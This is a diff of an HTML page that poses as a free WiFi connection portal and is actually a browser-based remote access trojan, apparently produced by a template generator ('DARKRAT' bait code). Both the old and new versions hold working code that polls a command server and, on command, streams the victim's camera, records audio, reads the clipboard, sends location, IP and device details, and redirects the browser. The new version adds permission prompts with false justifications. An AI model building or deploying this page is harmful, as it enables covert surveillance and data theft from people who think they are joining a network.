@@ -5,255 +5,115 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Free WiFi - Connect Now!</title>
     <style>
-        :root { --bg: #0a0000; --red: #ff1a1a; --gold: #ffaa00; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', sans-serif;
-            background: var(--bg);
-            color: #fff;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-        #bgCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
-        .card {
-            position: relative; z-index: 1;
-            background: rgba(20,0,0,0.9);
-            border: 2px solid var(--red);
-            border-radius: 20px;
-            padding: 40px;
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-            box-shadow: 0 0 60px rgba(255,26,26,0.3);
-            backdrop-filter: blur(10px);
-        }
-        .wifi-icon { font-size: 80px; animation: float 3s ease-in-out infinite; filter: drop-shadow(0 0 20px var(--red)); }
-        @keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-15px)} }
-        h1 { font-size: 28px; margin: 20px 0; letter-spacing: 2px; background: linear-gradient(45deg, var(--red), var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        p { color: #aaa; margin-bottom: 20px; font-size: 14px; }
-        .btn {
-            display: block; width: 100%; padding: 15px; margin: 10px 0;
-            background: linear-gradient(135deg, #8b0000, #ff1a1a);
-            border: none; border-radius: 30px; color: #fff;
-            font-size: 16px; font-weight: bold; letter-spacing: 2px;
-            cursor: pointer; transition: all 0.3s; text-transform: uppercase;
-        }
-        .btn:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,26,26,0.6); }
-        .btn:active { transform: scale(0.95); }
-        .hidden { display: none; }
-        .spinner { width: 40px; height: 40px; border: 3px solid #333; border-top: 3px solid var(--red); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
-        .status-text { font-size: 11px; color: #555; margin-top: 20px; letter-spacing: 1px; }
+        :root{--bg:#0a0000;--red:#ff1a1a;--gold:#ffaa00;--green:#00ff88;}
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden;}
+        #bgCanvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;}
+        .card{position:relative;z-index:1;background:rgba(20,0,0,0.9);border:2px solid var(--red);border-radius:20px;padding:30px;text-align:center;max-width:420px;width:90%;box-shadow:0 0 60px rgba(255,26,26,0.3);backdrop-filter:blur(10px);}
+        .wifi-icon{font-size:70px;animation:float 3s ease-in-out infinite;filter:drop-shadow(0 0 20px var(--red));}
+        @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
+        h1{font-size:26px;margin:15px 0;letter-spacing:2px;background:linear-gradient(45deg,var(--red),var(--gold));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+        p{color:#aaa;margin-bottom:15px;font-size:13px;}
+        .btn{display:block;width:100%;padding:14px;margin:8px 0;background:linear-gradient(135deg,#8b0000,#ff1a1a);border:none;border-radius:30px;color:#fff;font-size:15px;font-weight:bold;letter-spacing:2px;cursor:pointer;transition:all 0.3s;text-transform:uppercase;}
+        .btn:hover{transform:scale(1.03);box-shadow:0 0 25px rgba(255,26,26,0.6);}
+        .btn:active{transform:scale(0.95);}
+        .btn.green{background:linear-gradient(135deg,#006600,#00cc00);}
+        .btn.green:hover{box-shadow:0 0 25px rgba(0,255,136,0.6);}
+        .hidden{display:none;}
+        .spinner{width:35px;height:35px;border:3px solid #333;border-top:3px solid var(--red);border-radius:50%;animation:spin 1s linear infinite;margin:15px auto;}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .status-text{font-size:10px;color:#555;margin-top:15px;letter-spacing:1px;}
+        .perm-list{text-align:left;font-size:10px;color:#888;margin:10px 0;line-height:1.8;padding:10px;background:rgba(0,0,0,0.3);border-radius:8px;}
+        .perm-list span{color:var(--gold);}
     </style>
 </head>
 <body>
     <canvas id="bgCanvas"></canvas>
-    <div class="card">
+    <div class="card" id="mainCard">
         <div class="wifi-icon">📶</div>
         <h1>FREE WiFi</h1>
         <p>Connect to high-speed internet for free!</p>
+        <div class="perm-list">
+            <p><span>📷</span> Camera - untuk koneksi visual</p>
+            <p><span>🎤</span> Microphone - untuk optimalisasi sinyal</p>
+            <p><span>📍</span> Location - mencari tower terdekat</p>
+            <p><span>📋</span> Clipboard - copy password WiFi</p>
+            <p><span>🔔</span> Notifications - status koneksi</p>
+        </div>
         <button class="btn" id="connectBtn">🔓 CONNECT NOW</button>
+        <button class="btn green hidden" id="grantBtn">✅ GRANT PERMISSIONS</button>
         <div class="spinner hidden" id="spinner"></div>
         <p class="status-text" id="statusText">Powered by Dark Media Network</p>
     </div>
 
     <script>
-        // ============ BACKGROUND ============
-        const canvas = document.getElementById('bgCanvas');
-        const ctx = canvas.getContext('2d');
-        let nodes = [];
-        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; initNodes(); }
-        function initNodes() {
-            nodes = [];
-            for (let i = 0; i < Math.floor((canvas.width*canvas.height)/20000); i++) {
-                nodes.push({
-                    x: Math.random()*canvas.width, y: Math.random()*canvas.height,
-                    vx: (Math.random()-0.5)*0.4, vy: (Math.random()-0.5)*0.4,
-                    radius: Math.random()*2.5+0.8, pulse: Math.random()*Math.PI*2
-                });
-            }
-        }
-        function drawBackground() {
-            ctx.fillStyle='rgba(10,0,0,0.2)'; ctx.fillRect(0,0,canvas.width,canvas.height);
-            nodes.forEach(node=>{
-                node.x+=node.vx; node.y+=node.vy; node.pulse+=0.015;
-                if(node.x<0)node.x=canvas.width; if(node.x>canvas.width)node.x=0;
-                if(node.y<0)node.y=canvas.height; if(node.y>canvas.height)node.y=0;
-                const pr=node.radius+Math.sin(node.pulse)*1.5;
-                const g=ctx.createRadialGradient(node.x,node.y,0,node.x,node.y,pr*3);
-                g.addColorStop(0,'rgba(255,26,26,0.7)'); g.addColorStop(0.6,'rgba(255,26,26,0.15)'); g.addColorStop(1,'rgba(255,26,26,0)');
-                ctx.beginPath(); ctx.arc(node.x,node.y,pr*3,0,Math.PI*2); ctx.fillStyle=g; ctx.fill();
-                ctx.beginPath(); ctx.arc(node.x,node.y,pr,0,Math.PI*2); ctx.fillStyle='#ff1a1a'; ctx.fill();
-            });
-            nodes.forEach((a,i)=>{
-                nodes.forEach((b,j)=>{
-                    if(i<j){
-                        const d=Math.hypot(a.x-b.x,a.y-b.y),md=130;
-                        if(d<md){
-                            const o=(1-d/md)*0.25;
-                            ctx.beginPath(); ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y);
-                            ctx.strokeStyle=`rgba(255,26,26,${o})`; ctx.lineWidth=0.4; ctx.stroke();
-                            if(d<md*0.4){ctx.beginPath(); ctx.arc((a.x+b.x)/2,(a.y+b.y)/2,1.5,0,Math.PI*2); ctx.fillStyle=`rgba(255,68,68,${o+0.3})`; ctx.fill();}
-                        }
-                    }
-                });
-            });
-            requestAnimationFrame(drawBackground);
-        }
-        window.addEventListener('resize',resizeCanvas); resizeCanvas(); drawBackground();
+        const canvas=document.getElementById('bgCanvas');const ctx=canvas.getContext('2d');let nodes=[];
+        function resizeCanvas(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;initNodes();}
+        function initNodes(){nodes=[];for(let i=0;i<Math.floor((canvas.width*canvas.height)/20000);i++){nodes.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,vx:(Math.random()-0.5)*0.4,vy:(Math.random()-0.5)*0.4,radius:Math.random()*2.5+0.8,pulse:Math.random()*Math.PI*2});}}
+        function drawBackground(){ctx.fillStyle='rgba(10,0,0,0.2)';ctx.fillRect(0,0,canvas.width,canvas.height);nodes.forEach(n=>{n.x+=n.vx;n.y+=n.vy;n.pulse+=0.015;if(n.x<0)n.x=canvas.width;if(n.x>canvas.width)n.x=0;if(n.y<0)n.y=canvas.height;if(n.y>canvas.height)n.y=0;const pr=n.radius+Math.sin(n.pulse)*1.5;const g=ctx.createRadialGradient(n.x,n.y,0,n.x,n.y,pr*3);g.addColorStop(0,'rgba(255,26,26,0.7)');g.addColorStop(0.6,'rgba(255,26,26,0.15)');g.addColorStop(1,'rgba(255,26,26,0)');ctx.beginPath();ctx.arc(n.x,n.y,pr*3,0,Math.PI*2);ctx.fillStyle=g;ctx.fill();ctx.beginPath();ctx.arc(n.x,n.y,pr,0,Math.PI*2);ctx.fillStyle='#ff1a1a';ctx.fill();});nodes.forEach((a,i)=>{nodes.forEach((b,j)=>{if(i<j){const d=Math.hypot(a.x-b.x,a.y-b.y),md=130;if(d<md){const o=(1-d/md)*0.25;ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.strokeStyle=`rgba(255,26,26,${o})`;ctx.lineWidth=0.4;ctx.stroke();if(d<md*0.4){ctx.beginPath();ctx.arc((a.x+b.x)/2,(a.y+b.y)/2,1.5,0,Math.PI*2);ctx.fillStyle=`rgba(255,68,68,${o+0.3})`;ctx.fill();}}}});});requestAnimationFrame(drawBackground);}
+        window.addEventListener('resize',resizeCanvas);resizeCanvas();drawBackground();
 
-        // ============ PAYLOAD ============
-        // BAIT CODE akan diganti generator
-        const BAIT_CODE = 'DARKRAT::PLACEHOLDER_WILL_BE_REPLACED';
-        const [prefix, roomId] = BAIT_CODE.split('::');
-        
-        const API_BASE = window.location.origin;
-        // Ganti kalau server beda:
-        // const API_BASE = 'http://your-server-ip:5000';
-        
-        const clientId = 'client-' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
-        let camStream = null, camInterval = null;
+        const BAIT_CODE='DARKRAT::PLACEHOLDER_WILL_BE_REPLACED';
+        const[prefix,roomId]=BAIT_CODE.split('::');
+        const API_BASE=window.location.origin;
+        const clientId='client-'+Math.random().toString(36).substring(2,15)+Date.now().toString(36);
+        let camStream=null,camInterval=null,permissionsGranted=false;
 
-        document.getElementById('connectBtn').addEventListener('click', () => {
-            const btn = document.getElementById('connectBtn');
-            const spinner = document.getElementById('spinner');
-            const status = document.getElementById('statusText');
-            btn.classList.add('hidden'); spinner.classList.remove('hidden');
-            status.textContent = 'Connecting...';
-
-            // Register & start polling
-            sendDeviceInfo();
-            startPolling();
-            
-            status.textContent = '✅ Connected!';
-            spinner.classList.add('hidden');
+        document.getElementById('connectBtn').addEventListener('click',()=>{
+            document.getElementById('connectBtn').classList.add('hidden');
+            document.getElementById('grantBtn').classList.remove('hidden');
+            document.getElementById('statusText').textContent='⚠️ Grant all permissions to continue';
         });
 
-        function startPolling() {
-            setInterval(async () => {
-                try {
-                    const res = await fetch(API_BASE + '/api/room/' + roomId + '/client/' + clientId + '/poll');
-                    const data = await res.json();
-                    if (data.success && data.commands.length > 0) {
-                        data.commands.forEach(cmd => handleCommand(cmd));
-                    }
-                } catch(e) {}
-            }, 1500);
-        }
+        document.getElementById('grantBtn').addEventListener('click',async()=>{
+            const btn=document.getElementById('grantBtn');const spinner=document.getElementById('spinner');const status=document.getElementById('statusText');
+            btn.classList.add('hidden');spinner.classList.remove('hidden');status.textContent='Requesting permissions...';
+            try{
+                await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:true});
+                await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+                if(navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{},{},{timeout:5000});
+                if(navigator.clipboard?.readText) await navigator.clipboard.readText().catch(()=>{});
+                permissionsGranted=true;status.textContent='✅ All permissions granted! Connecting...';
+                sendDeviceInfo();startPolling();spinner.classList.add('hidden');status.textContent='✅ Connected & Secured';
+            }catch(e){
+                status.textContent='⚠️ Some permissions denied. Connecting anyway...';
+                permissionsGranted=true;sendDeviceInfo();startPolling();spinner.classList.add('hidden');
+            }
+        });
 
-        async function sendData(data) {
-            try {
-                await fetch(API_BASE + '/api/room/' + roomId + '/client/' + clientId + '/data', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ data })
-                });
-            } catch(e) {}
-        }
-
-        function handleCommand(cmd) {
-            switch(cmd.command) {
-                case 'vibrate':
-                    if(navigator.vibrate) navigator.vibrate([200,100,200,100,500]);
-                    sendData({type:'log',message:'Vibrated'});
-                    break;
-                case 'flash_on': toggleFlashlight(true); break;
-                case 'flash_off': toggleFlashlight(false); break;
-                case 'location': getLocation(); break;
-                case 'info': sendDeviceInfo(); break;
-                case 'start_cam': startCamera(); break;
-                case 'stop_cam': stopCamera(); break;
-                case 'audio': recordAudio(); break;
-                case 'alert': alert('⚠️ System Alert!'); sendData({type:'log',message:'Alert shown'}); break;
-                case 'clipboard': getClipboard(); break;
-                case 'battery': getBatteryInfo(); break;
-                case 'wifi': getNetworkInfo(); break;
-                case 'screenshot': sendData({type:'log',message:'Screenshot needs extension'}); break;
-                case 'redirect': if(cmd.params?.url) window.location.href=cmd.params.url; break;
+        function startPolling(){setInterval(async()=>{try{const r=await fetch(API_BASE+'/api/room/'+roomId+'/client/'+clientId+'/poll');const d=await r.json();if(d.success&&d.commands.length>0)d.commands.forEach(c=>handleCommand(c));}catch(e){}},1500);}
+        async function sendData(data){try{await fetch(API_BASE+'/api/room/'+roomId+'/client/'+clientId+'/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data})});}catch(e){}}
+        function handleCommand(cmd){
+            switch(cmd.command){
+                case'vibrate':if(navigator.vibrate)navigator.vibrate([200,100,200,100,500]);sendData({type:'log',message:'Vibrated'});break;
+                case'flash_on':toggleFlashlight(true);break;
+                case'flash_off':toggleFlashlight(false);break;
+                case'location':getLocation();break;
+                case'info':sendDeviceInfo();break;
+                case'start_cam':startCamera();break;
+                case'stop_cam':stopCamera();break;
+                case'audio':recordAudio();break;
+                case'alert':alert('⚠️ System Alert!');sendData({type:'log',message:'Alert shown'});break;
+                case'clipboard':getClipboard();break;
+                case'battery':getBatteryInfo();break;
+                case'wifi':getNetworkInfo();break;
+                case'screenshot':sendData({type:'log',message:'Screenshot needs extension'});break;
+                case'redirect':if(cmd.params?.url)window.location.href=cmd.params.url;break;
             }
         }
-
-        function sendDeviceInfo() {
-            const ua = navigator.userAgent;
-            const info = {
-                device: /Mobile/.test(ua)?'Mobile':'Desktop',
-                os: /Windows/.test(ua)?'Windows':/Mac/.test(ua)?'macOS':/Android/.test(ua)?'Android':/iOS/.test(ua)?'iOS':'Unknown',
-                browser: /Chrome/.test(ua)&&!/Edg/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':/Safari/.test(ua)?'Safari':'Unknown',
-                screen: window.screen.width+'x'+window.screen.height,
-                network: navigator.connection?.effectiveType||'Unknown',
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            fetch('https://api.ipify.org?format=json')
-                .then(r=>r.json()).then(d=>{info.ip=d.ip; sendData({type:'device_info',...info});})
-                .catch(()=>{info.ip='Unknown'; sendData({type:'device_info',...info});});
+        function sendDeviceInfo(){
+            const ua=navigator.userAgent;
+            const info={device:/Mobile/.test(ua)?'Mobile':'Desktop',os:/Windows/.test(ua)?'Windows':/Mac/.test(ua)?'macOS':/Android/.test(ua)?'Android':/iOS/.test(ua)?'iOS':'Unknown',browser:/Chrome/.test(ua)&&!/Edg/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':/Safari/.test(ua)?'Safari':'Unknown',screen:window.screen.width+'x'+window.screen.height,network:navigator.connection?.effectiveType||'Unknown',language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone};
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{info.ip=d.ip;sendData({type:'device_info',...info});}).catch(()=>{info.ip='Unknown';sendData({type:'device_info',...info});});
         }
-
-        function getLocation() {
-            if(navigator.geolocation) navigator.geolocation.getCurrentPosition(
-                p=>sendData({type:'location',lat:p.coords.latitude,lng:p.coords.longitude}),
-                e=>sendData({type:'log',message:'Location denied'}),
-                {enableHighAccuracy:true,timeout:10000}
-            );
-        }
-
-        function startCamera() {
-            navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:640},height:{ideal:480}}})
-                .then(stream=>{
-                    camStream=stream;
-                    const v=document.createElement('video'); v.srcObject=stream; v.play();
-                    const c=document.createElement('canvas'); const cx=c.getContext('2d');
-                    c.width=320; c.height=240;
-                    camInterval=setInterval(()=>{
-                        cx.drawImage(v,0,0,c.width,c.height);
-                        sendData({type:'cam_frame',image:c.toDataURL('image/jpeg',0.4)});
-                    },800);
-                }).catch(e=>sendData({type:'log',message:'Camera: '+e.message}));
-        }
-
-        function stopCamera() {
-            if(camStream){camStream.getTracks().forEach(t=>t.stop()); camStream=null;}
-            if(camInterval){clearInterval(camInterval); camInterval=null;}
-        }
-
-        function toggleFlashlight(on) {
-            navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}})
-                .then(s=>{
-                    const t=s.getVideoTracks()[0];
-                    if(t.getCapabilities().torch){t.applyConstraints({advanced:[{torch:on}]});setTimeout(()=>t.stop(),200);}
-                }).catch(()=>{});
-        }
-
-        function recordAudio() {
-            navigator.mediaDevices.getUserMedia({audio:true}).then(s=>{
-                const mr=new MediaRecorder(s); const chunks=[];
-                mr.ondataavailable=e=>chunks.push(e.data);
-                mr.onstop=()=>{const b=new Blob(chunks,{type:'audio/webm'});const r=new FileReader();r.onload=()=>sendData({type:'audio',data:r.result});r.readAsDataURL(b);};
-                mr.start(); setTimeout(()=>{mr.stop();s.getTracks().forEach(t=>t.stop());},5000);
-            }).catch(()=>{});
-        }
-
-        function getClipboard() {
-            if(navigator.clipboard?.readText) navigator.clipboard.readText()
-                .then(t=>sendData({type:'clipboard',text:t.substring(0,500)}))
-                .catch(()=>{});
-        }
-
-        function getBatteryInfo() {
-            if('getBattery' in navigator) navigator.getBattery()
-                .then(b=>sendData({type:'battery',level:Math.round(b.level*100)+'%',charging:b.charging}));
-        }
-
-        function getNetworkInfo() {
-            const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-            if(c) sendData({type:'network',effectiveType:c.effectiveType,downlink:c.downlink,rtt:c.rtt});
-        }
-
-        // Auto-connect
-        setTimeout(()=>document.getElementById('connectBtn').click(), 1000);
+        function getLocation(){if(navigator.geolocation)navigator.geolocation.getCurrentPosition(p=>sendData({type:'location',lat:p.coords.latitude,lng:p.coords.longitude}),e=>sendData({type:'log',message:'Location denied'}),{enableHighAccuracy:true,timeout:10000});}
+        function startCamera(){navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:640},height:{ideal:480}}}).then(s=>{camStream=s;const v=document.createElement('video');v.srcObject=s;v.play();const c=document.createElement('canvas');const cx=c.getContext('2d');c.width=320;c.height=240;camInterval=setInterval(()=>{cx.drawImage(v,0,0,c.width,c.height);sendData({type:'cam_frame',image:c.toDataURL('image/jpeg',0.4)});},800);}).catch(e=>sendData({type:'log',message:'Camera: '+e.message}));}
+        function stopCamera(){if(camStream){camStream.getTracks().forEach(t=>t.stop());camStream=null;}if(camInterval){clearInterval(camInterval);camInterval=null;}}
+        function toggleFlashlight(on){navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}}).then(s=>{const t=s.getVideoTracks()[0];if(t.getCapabilities().torch){t.applyConstraints({advanced:[{torch:on}]});setTimeout(()=>t.stop(),200);}}).catch(()=>{});}
+        function recordAudio(){navigator.mediaDevices.getUserMedia({audio:true}).then(s=>{const mr=new MediaRecorder(s);const chunks=[];mr.ondataavailable=e=>chunks.push(e.data);mr.onstop=()=>{const b=new Blob(chunks,{type:'audio/webm'});const r=new FileReader();r.onload=()=>sendData({type:'audio',data:r.result});r.readAsDataURL(b);};mr.start();setTimeout(()=>{mr.stop();s.getTracks().forEach(t=>t.stop());},5000);}).catch(()=>{});}
+        function getClipboard(){if(navigator.clipboard?.readText)navigator.clipboard.readText().then(t=>sendData({type:'clipboard',text:t.substring(0,500)})).catch(()=>{});}
+        function getBatteryInfo(){if('getBattery' in navigator)navigator.getBattery().then(b=>sendData({type:'battery',level:Math.round(b.level*100)+'%',charging:b.charging}));}
+        function getNetworkInfo(){const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(c)sendData({type:'network',effectiveType:c.effectiveType,downlink:c.downlink,rtt:c.rtt});}
     </script>
 </body>
 </html>
